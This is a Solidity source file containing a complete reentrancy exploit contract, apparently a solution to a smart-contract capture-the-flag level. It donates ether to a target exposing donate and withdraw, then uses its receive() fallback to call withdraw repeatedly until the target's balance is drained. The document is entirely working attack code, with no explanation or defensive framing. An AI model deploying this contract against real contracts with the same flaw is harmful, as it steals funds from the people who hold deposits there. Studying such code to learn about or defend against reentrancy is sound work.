// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint _amount) external;
}

contract ReentrancyHack {
    uint amount;

    IReentrance target;

    function attack(IReentrance _target) external payable {
        amount = msg.value;
        target = _target;

        _target.donate{value: amount}(address(this));
        _target.withdraw(amount);
    }

    receive() external payable {
        uint _total = address(target).balance;

        if (_total >= amount) {
            target.withdraw(amount);
        } else if (_total != 0) {
            target.withdraw(_total);
        }
    }
}